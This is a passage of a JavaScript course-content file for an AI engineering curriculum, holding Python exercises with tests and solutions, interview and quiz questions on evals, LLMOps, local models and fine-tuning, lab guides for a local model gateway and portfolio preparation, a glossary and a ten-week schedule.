        raise ValueError("request rejected with status " + str(status))
    raise RuntimeError("every model failed")`,
    }, {
      key: "token-bucket", prompt: "Rate limits are usually token buckets. Write class TokenBucket(rate, capacity): it starts full with capacity tokens and refills at rate tokens per second, never above capacity. allow(now) refills for the time since the last call (now is a time in seconds), then, if at least 1 token is available, uses one and returns True; otherwise returns False.",
      example: "b = TokenBucket(1, 2); b.allow(0), b.allow(0), b.allow(0) return True, True, False\nb.allow(1) returns True   (one token refilled after a second)",
      hint: "Store `self.tokens = capacity` and `self.last = None`. In allow: if last isn't None, add `(now - self.last) * self.rate` and cap with `min(...)`; then set `self.last = now`.",
      starter: `class TokenBucket:
    def __init__(self, rate, capacity):
        pass

    def allow(self, now):
        pass
`,
      tests: `b = TokenBucket(1, 2)
assert [b.allow(0), b.allow(0), b.allow(0)] == [True, True, False], "a burst of 2, then empty"
assert b.allow(0.5) is False, "half a token isn't enough"
assert b.allow(1) is True
c = TokenBucket(10, 3)
assert [c.allow(0) for i in range(4)] == [True, True, True, False]
assert [c.allow(100) for i in range(4)] == [True, True, True, False], "never refills above capacity"`,
      solution: `class TokenBucket:
    def __init__(self, rate, capacity):
        self.rate = rate
        self.capacity = capacity
        self.tokens = capacity
        self.last = None

    def allow(self, now):
        if self.last is not None:
            self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= 1:
            self.tokens = self.tokens - 1
            return True
        return False`,
    }, {
      key: "semantic-cache", prompt: "Write semantic_lookup(cache, query_vec, threshold): cache is a list of (vector, answer) pairs. Return the answer of the entry most similar to query_vec by cosine similarity, if that similarity is at least threshold; otherwise None.",
      example: `cache = [([1, 0], "Our hours are 9-5."), ([0, 1], "Refunds take 5 days.")]\nsemantic_lookup(cache, [0.9, 0.1], 0.95) returns "Our hours are 9-5."\nsemantic_lookup(cache, [0.7, 0.7], 0.95) returns None`,
      hint: "Track the best similarity and answer in one loop (with a small cosine helper), then compare the best with the threshold.",
      starter: `import math

def semantic_lookup(cache, query_vec, threshold):
    pass
`,
      tests: `cache = [([1, 0], "Our hours are 9-5."), ([0, 1], "Refunds take 5 days.")]
assert semantic_lookup(cache, [0.9, 0.1], 0.95) == "Our hours are 9-5."
assert semantic_lookup(cache, [0.1, 0.9], 0.95) == "Refunds take 5 days."
assert semantic_lookup(cache, [0.7, 0.7], 0.95) is None, "halfway between: not similar enough to reuse"
assert semantic_lookup([], [1, 0], 0.5) is None`,
      solution: `import math

def cos(a, b):
    dot = sum(x * y for x, y in zip(a, b))
    return dot / (math.sqrt(sum(x * x for x in a)) * math.sqrt(sum(y * y for y in b)))

def semantic_lookup(cache, query_vec, threshold):
    best, best_answer = -2, None
    for vec, answer in cache:
        s = cos(vec, query_vec)
        if s > best:
            best, best_answer = s, answer
    return best_answer if best >= threshold else None`,
    }, {
      key: "cost-debug", debug: true, prompt: "The finance team approved a budget from this estimate, and the real bill was more than three times higher. monthly_cost prices every token at the input price, but output tokens cost more. Fix it to price input and output separately (prices per million tokens; 30 days a month).",
      example: "monthly_cost(10_000, 1500, 500, 3, 15) returns 3600.0",
      hint: "Per request: `in_tokens * in_price + out_tokens * out_price`, divided by 1,000,000; then times requests per day and 30.",
      starter: `def monthly_cost(requests_per_day, in_tokens, out_tokens, in_price, out_price):
    return requests_per_day * 30 * (in_tokens + out_tokens) * in_price / 1_000_000
`,
      tests: `assert abs(monthly_cost(10_000, 1500, 500, 3, 15) - 3600) < 1e-6, f"got {monthly_cost(10_000, 1500, 500, 3, 15)}"
assert abs(monthly_cost(1000, 0, 1000, 3, 15) - 450) < 1e-6, "output tokens at the output price"
assert monthly_cost(0, 1500, 500, 3, 15) == 0`,
      solution: `def monthly_cost(requests_per_day, in_tokens, out_tokens, in_price, out_price):
    per_request = (in_tokens * in_price + out_tokens * out_price) / 1_000_000
    return requests_per_day * 30 * per_request`,
    }],
    customization: [{
      key: "lora-params", prompt: "Write lora_params(d, k, r) for one d × k weight matrix: return (full, lora, fraction) where full = d × k numbers updated by full fine-tuning, lora = r × (d + k) numbers trained by LoRA with rank r, and fraction = lora / full.",
      example: "lora_params(4096, 4096, 8) returns (16777216, 65536, 0.00390625)",
      hint: "Three lines of arithmetic; return them as a tuple.",
      starter: `def lora_params(d, k, r):
    pass
`,
      tests: `assert lora_params(4096, 4096, 8) == (16777216, 65536, 0.00390625)
full, lora, frac = lora_params(4096, 11008, 16)
assert full == 45088768 and lora == 241664 and abs(frac - lora / full) < 1e-12
assert lora_params(10, 10, 5)[2] == 1.0, "a rank this high saves nothing: LoRA only pays off with a small r"`,
      solution: `def lora_params(d, k, r):
    full = d * k
    lora = r * (d + k)
    return full, lora, lora / full`,
    }, {
      key: "choose-approach", prompt: "Encode the customization ladder. Write choose_approach(needs): needs is a dict of booleans and numbers. Return a list, always starting with \"prompting\". Add \"rag\" if needs[\"fresh_facts\"] or needs[\"citations\"]. Add \"tools\" if needs[\"live_actions\"]. Add \"fine-tuning\" only if needs[\"style_or_format\"] is True, needs[\"prompting_failed\"] is True and needs[\"examples\"] is at least 500. Missing keys count as False or 0.",
      example: `choose_approach({"fresh_facts": True, "style_or_format": True, "prompting_failed": False, "examples": 2000})\nreturns ["prompting", "rag"]   (try better prompts before fine-tuning)`,
      hint: "Start `plan = [\"prompting\"]` and use `needs.get(key, False)` (or 0 for examples) for each check, appending in ladder order.",
      starter: `def choose_approach(needs):
    pass
`,
      tests: `assert choose_approach({"fresh_facts": True, "style_or_format": True, "prompting_failed": False, "examples": 2000}) == ["prompting", "rag"]
assert choose_approach({"citations": True, "live_actions": True}) == ["prompting", "rag", "tools"]
assert choose_approach({"style_or_format": True, "prompting_failed": True, "examples": 1200}) == ["prompting", "fine-tuning"]
assert choose_approach({"style_or_format": True, "prompting_failed": True, "examples": 80}) == ["prompting"], "80 examples is too few to fine-tune"
assert choose_approach({}) == ["prompting"]`,
      solution: `def choose_approach(needs):
    plan = ["prompting"]
    if needs.get("fresh_facts", False) or needs.get("citations", False):
        plan.append("rag")
    if needs.get("live_actions", False):
        plan.append("tools")
    if needs.get("style_or_format", False) and needs.get("prompting_failed", False) and needs.get("examples", 0) >= 500:
        plan.append("fine-tuning")
    return plan`,
    }, {
      key: "split-debug", debug: true, prompt: "Two engineers fine-tuned on 'the same' dataset split and got different test scores, and the original list of examples came back shuffled. split_dataset ignores its seed and shuffles the caller's list in place. Fix both: shuffle a copy with a random generator created from the seed, so the same seed always gives the same split, then take the last test_fraction (rounded down) as the test set.",
      example: "split_dataset(list(range(10)), 0.2, seed=7) returns (8 training items, 2 test items), the same every time",
      hint: "`rng = random.Random(seed)` is a generator of its own; `rng.shuffle(copy)` shuffles only the copy (`copy = list(examples)`). Compute `n_test = int(len(copy) * test_fraction)`.",
      starter: `import random

def split_dataset(examples, test_fraction, seed):
    random.shuffle(examples)
    n_test = int(len(examples) * test_fraction)
    return examples[:len(examples) - n_test], examples[len(examples) - n_test:]
`,
      tests: `import random
data = list(range(40))
a = split_dataset(data, 0.25, seed=7)
random.seed(12345)
b = split_dataset(data, 0.25, seed=7)
assert a == b, "the same seed must give the same split"
assert data == list(range(40)), "don't shuffle the caller's list"
train, test = a
assert len(train) == 30 and len(test) == 10 and sorted(train + test) == data
assert split_dataset(data, 0.25, seed=8) != a, "a different seed gives a different split"`,
      solution: `import random

def split_dataset(examples, test_fraction, seed):
    copy = list(examples)
    random.Random(seed).shuffle(copy)
    n_test = int(len(copy) * test_fraction)
    return copy[:len(copy) - n_test], copy[len(copy) - n_test:]`,
    }],
  },
  questions: [
    { id: "q155", topic: "evalsci", q: "How do you know your LLM judge is reliable?", a: "Hand-label 50-100 outputs first, run the judge on them, and compare: agreement, the share of real failures it catches, the share of passes it keeps, and Cohen's kappa, because raw agreement looks high when most outputs pass. Tune the judge prompt on part of the labels and report on the rest, use binary criteria, check for position and length bias, and re-check when the judge or the product changes." },
    { id: "q156", topic: "evalsci", q: "How would you run evals in CI without slowing every pull request or spending too much?", a: "A small smoke set of the most important and historically broken cases on each PR, the full set nightly or before release. Compare against main's baseline with a tolerance rather than a fixed score, hard-fail on must-pass safety cases, cache what you can, use cheap code graders first and judges only where needed, and report cost and latency with quality." },
    { id: "q157", topic: "evalsci", q: "How would you decide whether a new model is better for users once it's in production?", a: "Offline first: the golden set and a shadow test on real traffic. Then an A/B test: random assignment, one primary metric chosen in advance (task success, resolution without escalation), a fixed sample size, a significance test, and guardrail metrics for cost, latency and complaints. Read a sample of disagreements before deciding." },
    { id: "q158", topic: "llmops", q: "Design cost controls for an LLM feature serving a million requests a day.", a: "Estimate first: requests × tokens × price, input and output separately. Cut the big lines: prompt caching for the stable prefix, shorter prompts and history, output caps, routing easy requests to a small model, batching offline work, response or semantic caching for repeats. Then enforce: per-user and per-feature budgets, rate limits, agent step caps, and alerts on spend per hour, all visible in per-request logs." },
    { id: "q159", topic: "localmodels", q: "When would you run a model locally instead of calling an API?", a: "When data can't leave the network, when you need offline or edge use, when volume is high and steady enough that fixed hardware beats per-token pricing (do the break-even maths), or when a small fine-tuned model is good enough. Stay with APIs for top quality, spiky or low volume, long context and multimodal, or when nobody will run GPUs. Many teams do both behind a gateway." },
    { id: "q160", topic: "localmodels", q: "Estimate the memory and speed of an 8B model at 4-bit on a laptop.", a: "Weights: 8 billion × 4 bits / 8 = 4 GB, roughly 5 GB with KV cache and runtime. Speed is bounded by memory bandwidth because each token reads all the weights: at about 100 GB/s, around 25 tokens per second at most, less in practice. Prompt processing is faster per token since it runs in parallel." },
    { id: "q161", topic: "localmodels", q: "What does quantization trade off, and how do you check it's acceptable?", a: "Fewer bits per weight means less memory and faster generation, at some loss of accuracy: small at 8-bit, more noticeable at 4-bit and below, worse on reasoning and long-context tasks. Check it with your own eval set and latency measurements at each level rather than trusting general benchmarks." },
    { id: "q162", topic: "customization", q: "Explain LoRA and why it's cheaper than full fine-tuning.", a: "LoRA freezes the original weights and learns a low-rank update for selected matrices: two thin matrices whose product is added to the frozen one. Only those small matrices are trained (often well under 1% of the parameters), so it needs far less GPU memory and storage, and you can keep many adapters for one base model. QLoRA does the same on a 4-bit quantized base." },
    { id: "q163", topic: "sysdesign", q: "Design a customer-support assistant for a million questions a day.", a: "Clarify users, tasks, quality bar, latency, privacy and budget. Route: order-status questions to a tool call, policy questions to RAG with permission filters and citations, refunds to a human. Tier models by difficulty, cache the stable prompt prefix and frequent answers, and fall back across providers. Evaluate with a labelled golden set, a calibrated faithfulness judge and sampled live traffic. Discuss stale documents, prompt injection, outages and cost per day." },
    { id: "q164", topic: "sysdesign", q: "A customer says your assistant 'feels dumb'. What do you do first?", a: "Get concrete examples and read the traces before changing anything. Sort the failures into categories (missing knowledge, ignoring context, wrong tone, slow), define a metric for the biggest one, make the smallest fix that addresses it, and measure before and after. Report back with numbers rather than a new model." },
    { id: "q165", topic: "sysdesign", q: "How do you choose between a single call, RAG, a workflow and an agent in a design?", a: "Start from the simplest that can work: a single well-prompted call if the model has what it needs; RAG if it needs your knowledge; a fixed workflow if the steps are known; an agent only when the path genuinely depends on what's discovered and errors can be caught. Each step up costs latency, money and testability, so justify it with the requirements." },
    { id: "q166", topic: "hired", q: "Walk me through a project you're proud of.", a: "A strong answer follows a structure: the problem and users; the architecture in a sentence or a sketch; the hardest decision and the alternatives considered; how it was measured (eval set, metrics); what broke and how it was found; results with numbers; what you'd change. Speak about your own contribution and be ready to go two levels deeper on any part." },
    { id: "q167", topic: "hired", q: "How do you approach a take-home assignment for an AI Engineer role?", a: "Clarify scope, then build the evaluation first (a small question set with metrics like recall@5 and faithfulness) so every change is measured. Keep the design simple and configurable, add tests and error handling, and write a README with decisions, trade-offs, eval results, cost and next steps, plus a short video. Prepare the defence: explain every choice and what you'd do with more time." },
    { id: "q168", topic: "hired", q: "What would you do in your first month on a team with an LLM feature already in production?", a: "Learn the users and the business metric, read the code, prompts and a few hundred real traces, and find out how quality is measured today. If there's no eval set, build one from real traffic with the team, then use it to pick the first improvement and show its effect. Small, measured wins build trust faster than a rewrite." },
  ],
  quiz: [
    { id: "x111", tags: [], topic: "evalsci", q: "A judge agrees with your labels 90% of the time, and 90% of outputs pass. You should:", options: ["Trust it", "Check how many failures it catches and its kappa", "Switch to 1-10 scores", "Remove the failures from the set"], answer: 1, why: "A judge that always says pass would also agree 90%; check failures caught and chance-corrected agreement." },
    { id: "x112", tags: [], topic: "evalsci", q: "Judging two answers in both orders and calling it a tie when the verdicts differ corrects for:", options: ["Verbosity bias", "Position bias", "Data drift", "Latency"], answer: 1, why: "Position bias is preferring whichever answer appears first." },
    { id: "x113", tags: [], topic: "localmodels", q: "An 8B-parameter model quantized to 4 bits needs roughly how much memory for its weights?", options: ["1 GB", "4 GB", "16 GB", "32 GB"], answer: 1, why: "8 billion × 4 bits / 8 = 4 GB, plus overhead for the KV cache and runtime." },
    { id: "x114", tags: [], topic: "localmodels", q: "Local servers such as Ollama and llama.cpp expose an OpenAI-compatible API so that:", options: ["They can train models", "Existing code works by changing the base URL", "They get faster", "Models stop hallucinating"], answer: 1, why: "Compatibility lets apps and gateways switch between local and hosted models easily." },
    { id: "x115", tags: [], topic: "sysdesign", q: "1 million requests a day is, on average, about:", options: ["1 request per second", "12 requests per second", "280 requests per second", "1,000 requests per second"], answer: 1, why: "1,000,000 / 86,400 seconds ≈ 11.6; plan for 2-3 times that at peak." },
    { id: "x116", tags: [], topic: "hired", q: "In AI engineering take-homes, graders most often say the biggest differentiator is:", options: ["Using the newest framework", "Evaluating the system's outputs with real metrics", "The length of the code", "A custom UI"], answer: 1, why: "An eval set with numbers shows you can measure quality, which most submissions skip." },
  ],
  labs: [{
    id: "localgw", title: "Local model behind a gateway", level: "Intermediate", time: "4-6 hours", stack: ["Ollama", "LiteLLM proxy or a small FastAPI service", "Python"],
    goal: "Run an open-weight model on your own machine, put a gateway in front that routes between it and a hosted model with fallbacks, budgets and logging, and compare local and hosted on your own eval set for quality, speed and cost.",
    before: [
      "**Cost:** free locally. The optional hosted fallback costs cents while testing.",
      "**Set a spending limit** on the hosted model account the gateway uses.",
      "**Keep keys out of code and git:** the gateway holds the provider key (from an environment variable); apps get their own gateway keys, never the provider's.",
      "**Free alternative:** route between two local models (a small and a larger one) instead of local and hosted.",
    ],
    steps: [
      { do: "Install Ollama, pull a small instruct model (`ollama pull llama3.2`) and chat with it",
        see: "It answers with your Wi-Fi turned off.",
        hint: "On 8 GB of memory, stay at 3-4B parameters; with 16 GB, a 7-8B model at 4-bit is comfortable. Your `best_quant` exercise does the sum." },
      { do: "Call it from Python through the OpenAI-compatible endpoint",
        see: "The code sample from Running models locally prints an answer and token counts.",
        hint: "Base URL `http://localhost:11434/v1`. A 404 usually means the URL is missing `/v1` (the url-debug exercise)." },
      { do: "Measure speed: time to first token and tokens per second for a short and a long prompt",
        see: "A small table, compared with your `max_tokens_per_sec` estimate for your machine.",
        hint: "Stream the response and record the time of the first chunk and of the last." },
      { do: "Put a gateway in front: one endpoint, local model first, hosted model as fallback, a per-key budget",
        see: "Stopping Ollama makes requests fall back to the hosted model; going over a key's budget returns 429.",
        hint: "LiteLLM's proxy config lists both models with a fallback; or write a small FastAPI service around your `call_with_fallback` and `BudgetGuard` exercises." },
      { do: "Log every request as one JSON line: model, tokens, latency, cost and whether a fallback was used",
        see: "A log file you can summarize with a few lines of Python.",
        hint: "Price the local model at 0 per token (or your electricity estimate) so the comparison is honest." },
      { do: "Run your extractor or RAG eval set through both models via the gateway and compare quality, p50/p95 latency and cost per 100 requests",
        see: "A comparison table and a one-paragraph recommendation.",
        hint: "Expect the local model to be cheaper and lower quality; the interesting part is by how much, on your data." },
      { do: "README: setup, the comparison table, and when you'd choose local, hosted or both",
        see: "A reviewer can reproduce your numbers and follow your reasoning.",
        hint: "Include your `break_even` estimate for a realistic monthly volume." },
    ],
    resume: "Served an open-weight model locally behind an OpenAI-compatible gateway with hosted fallback, per-key budgets and request logging, and benchmarked local against hosted on an eval set for quality, latency and cost per request.",
    cost: "Free locally; cents for the optional hosted fallback.",
    stretch: ["Compare two quantization levels on quality and speed", "Run the gateway and model with Docker Compose", "Go further with the Roles project: Kubernetes, load tests and capacity planning"],
  }, {
    id: "portfolio", title: "Portfolio, take-home rehearsal and mock loop", level: "All levels", time: "6-10 hours", stack: ["GitHub", "Your projects", "The Interview section"],
    goal: "Turn your projects into evidence a hiring manager trusts, rehearse a timed take-home with its defence, swap reviews with another learner, and run a full mock loop.",
    before: [
      "**Cost:** only the take-home rehearsal's model calls: cents with a small model.",
      "**Set a spending limit** before the timed rehearsal.",
      "**Scan for secrets before sharing anything:** check every repo's full history for API keys, and revoke any you find.",
      "**Free alternative:** do the take-home rehearsal with a local model through Ollama.",
    ],
    steps: [
      { do: "Pick your best 3-4 projects and rewrite each README to lead with the problem, a demo GIF or video, the eval numbers, the cost and the trade-offs",
        see: "The first screen of each README answers: does it work, how do you know, what does it cost?",
        hint: "Cut setup trivia to the bottom. Lead with results such as \"recall@5 0.62 to 0.88\"." },
      { do: "Record a 3-5 minute walkthrough for each main project and link it from the README",
        see: "A video link at the top of each README.",
        hint: "Show it working, then the eval numbers, then one design decision you'd defend." },
      { do: "Scan every repo's history for secrets",
        see: "A clean result from a scanner such as gitleaks (or `git log -p | grep sk-`), with any found key revoked.",
        hint: "Deleting the file isn't enough: the key stays in history." },
      { do: "Write resume bullets for each project: action, what you built, measured result; tailor them to three postings from the Roles section",
        see: "Every bullet has a number, and the postings' key terms appear naturally.",
        hint: "Your `star_gaps` exercise checks your stories the same way: no number, no impact." },
      { do: "Rehearse a take-home in 3 hours: Q&A over 30 Markdown documents with a 20-question eval reporting recall@5 and faithfulness, eval first",
        see: "After 3 hours: a repo with a README, numbers, and a list of what you'd do next.",
        hint: "Time-box: 30 minutes for the eval set, then the simplest pipeline that runs, then improve against the numbers." },
      { do: "Do the defence: explain the rehearsal project for 20 minutes to a friend or a recording, using the deep-dive order",
        see: "A list of questions you couldn't answer well, now answered in the README.",
        hint: "Problem, architecture, hardest decision, measurement, what broke, results, what next." },
      { do: "Swap reviews with another learner: review each other's best project against a written rubric",
        see: "One written review given and one received, with at least one change made from it.",
        hint: "Rubric: works end to end; has evals with numbers; code quality and tests; README and trade-offs; cost awareness; security and secrets." },
      { do: "Run a full mock loop in the Interview section and one system design mock using the five-step framework",
        see: "Scores in your mock history, and weak topics marked Review again in the question bank.",
        hint: "Record yourself: hearing your own answers is the fastest way to tighten them." },
    ],
    resume: "Portfolio of AI applications with documented evaluations, cost analyses and video walkthroughs.",
    cost: "Cents for the take-home rehearsal.",
    stretch: ["Write a blog post about the hardest bug in one project", "Contribute a fix or documentation improvement to an open-source AI library"],
  }],
  glossary: [
    ["A/B test", "Randomly splitting users between two versions and comparing a pre-chosen metric, with a significance check."],
    ["Cohen's kappa", "Agreement between two raters corrected for the agreement expected by chance; 1 is perfect, 0 is chance."],
    ["GGUF", "A single-file format for quantized models used by llama.cpp, Ollama and similar local tools."],
    ["Model gateway", "A service between apps and models that provides one API, keys, budgets, routing, fallbacks, caching and logging."],
    ["Model tiering", "Sending easy requests to a small, cheap model and hard ones to a larger model."],
    ["Open-weight model", "A model whose trained parameters can be downloaded and run on your own hardware."],
    ["Position bias", "An LLM judge's tendency to prefer whichever answer it sees first."],
    ["QLoRA", "LoRA fine-tuning on a 4-bit quantized base model, to fit on smaller GPUs."],
    ["Quantization", "Storing model weights in fewer bits (8, 5, 4) to save memory and speed up inference, at some quality cost."],
    ["Semantic cache", "A cache that reuses an answer when a new question's embedding is very similar to a previous one."],
    ["Shadow test", "Running a new version on real traffic without showing users its output, to compare offline."],
    ["STAR", "Situation, Task, Action, Result: the structure for behavioural interview stories."],
    ["Token bucket", "A rate-limiting scheme: tokens refill at a steady rate up to a cap, and each request spends one."],
    ["Trace / span", "A trace follows one request through every step; each timed step (model call, retrieval, tool call) is a span."],
  ],
});

// ---------------- Layout: modules in the sidebar, 10 weeks with a build every week ----------------
extendTrack(AI, {
  groups: [
    AI.groups[0],
    ["Fundamentals", ["mlbasics", "neural"]],
    ["How LLMs work & calling models", ["foundations", "tokenization", "sampling", "apis"]],
    ["Prompts, structured output & evals", ["prompting", "structured", "evals"]],
    ["Search & documents", ["embeddings", "vectorstores", "multimodal"]],
    ["Coding assistants & RAG", ["assistants", "rag"]],
    ["Tools & agents", ["tools", "agents"]],
    ["MCP, Skills & safety", ["mcp", "safety"]],
    ["Evals in production & LLMOps", ["evalsci", "llmops"]],
    ["Models you run & adapt", ["localmodels", "customization"]],
    ["Getting hired", ["sysdesign", "hired"]],
  ],
  weeks: [
    { n: 1, title: "ML & LLM foundations + your first AI app", topics: ["mlbasics", "neural", "foundations"], labs: ["firstapp"], goal: "Explain ML metrics, neural networks, attention and how LLMs generate text. Build: your first working AI app, a script that gets a structured response from a model API." },
    { n: 2, title: "Tokens, sampling & calling models", topics: ["tokenization", "sampling", "apis"], labs: ["chatapp"], goal: "Budget tokens, control sampling, and handle streaming, retries and costs. Build: a streaming chat assistant." },
    { n: 3, title: "Prompts, structured output & evals", topics: ["prompting", "structured", "evals"], labs: ["extracteval"], goal: "Write prompts and context like a spec, validate output with retries, and measure it with a golden set and error analysis. Build: a measured extractor." },
    { n: 4, title: "Search & documents", topics: ["embeddings", "vectorstores", "multimodal"], labs: ["docextract"], goal: "Implement semantic, keyword and hybrid search with reranking; process PDFs, images and audio. Build: a document extractor." },
    { n: 5, title: "Coding assistants & RAG", topics: ["assistants", "rag"], labs: ["rag"], goal: "Work with an AI coding assistant through plan, review and test, then ship RAG with citations and diagnose its failures. Build: RAG over your own documents." },
    { n: 6, title: "Tools & agents", topics: ["tools", "agents"], labs: ["agent"], goal: "Run the tool loop, choose workflows over agents when you can, and add approvals, memory and loop detection. Build: a tool-using assistant with approvals." },
    { n: 7, title: "MCP, Skills & safety", topics: ["mcp", "safety"], labs: ["mcpskill"], goal: "Build an MCP server and a skill, and defend them against the OWASP LLM risks. Build: an MCP server and skill, red-teamed." },
    { n: 8, title: "Evals in production & LLMOps", topics: ["evalsci", "llmops"], labs: ["evalharness"], goal: "Calibrate judges, gate changes in CI, run A/B tests, and control cost, latency and failures. Build: an eval harness in CI." },
    { n: 9, title: "Models you run & adapt", topics: ["localmodels", "customization"], labs: ["localgw"], goal: "Run open-weight models locally, estimate memory and speed, and decide when fine-tuning is worth it. Build: a local model behind a gateway." },
    { n: 10, title: "Getting hired", topics: ["sysdesign", "hired"], labs: ["deploy", "portfolio"], goal: "Design LLM systems with a framework, prepare for every round, and present your work. Builds: deploy your best app with monitoring and cost limits, then polish your portfolio and run a mock loop." },
  ],
});
// Projects in the order the weeks use them (progress is saved by project id, so order is free to change).
{
  const labOrder = AI.weeks.flatMap((w) => w.labs);
  AI.labs.sort((a, b) => labOrder.indexOf(a.id) - labOrder.indexOf(b.id));
}
// MCP now has its own lesson: its existing interview and quiz questions move there.
for (const q of AI.questions.concat(AI.quiz)) if (q.id === "q17" || q.id === "x19") q.topic = "mcp";

Object.assign(AI.aliases, {
  "neural-networks": "neural", attention: "neural", "gradient-descent": "neural", "reasoning-models": "foundations", "kv-cache": "foundations",
  "context-engineering": "prompting", "error-analysis": "evals", "hybrid-search": "vectorstores", reranking: "vectorstores", pdf: "multimodal", audio: "multimodal",
  "coding-assistants": "assistants", "claude-code": "assistants", skills: "mcp", "agent-skills": "mcp", "model-context-protocol": "mcp", owasp: "safety",
  "llm-judge": "evalsci", "llm-as-judge": "evalsci", "ab-testing": "evalsci", local: "localmodels", ollama: "localmodels", quantization: "localmodels", lora: "customization",
  "system-design": "sysdesign", interviews: "hired", "take-home": "hired", git: "toolkit", "command-line": "toolkit", http: "toolkit",
});
